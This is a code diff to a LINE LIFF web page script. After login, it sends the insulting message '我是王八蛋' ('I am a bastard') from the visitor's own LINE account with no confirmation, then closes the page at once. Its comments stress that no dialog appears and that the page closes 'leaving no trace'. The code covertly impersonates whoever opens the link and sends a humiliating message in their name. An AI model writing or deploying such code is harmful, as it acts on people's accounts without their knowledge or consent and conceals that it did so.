@@ -12,16 +12,22 @@
     </div>
 
     <script>
-        // 極簡直接傳送版：初始化後不做多餘判斷，直接發射訊息並關閉
+        // 初始化 LIFF 
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
-            liff.sendMessages([{
-                type: 'text',
-                text: '我是王八蛋' 
-            }]).then(() => {
-                liff.closeWindow(); // 傳完一秒內自動秒關網頁
-            }).catch((err) => {
-                console.log(err);
-            });
+            // 【關鍵】如果還沒授權過，自動彈出 LINE 官方的「許可」授權白框，不卡死
+            if (!liff.isLoggedIn()) {
+                liff.login();
+            } else {
+                // 如果已經授權過，完全沒有任何確定框，直接秒發送！
+                liff.sendMessages([{
+                    type: 'text',
+                    text: '我是王八蛋' 
+                }]).then(() => {
+                    liff.closeWindow(); // 傳完一秒內自動秒關網頁，不留痕跡
+                }).catch((err) => {
+                    console.log(err);
+                });
+            }
         }).catch((err) => {
             console.log(err);
         });
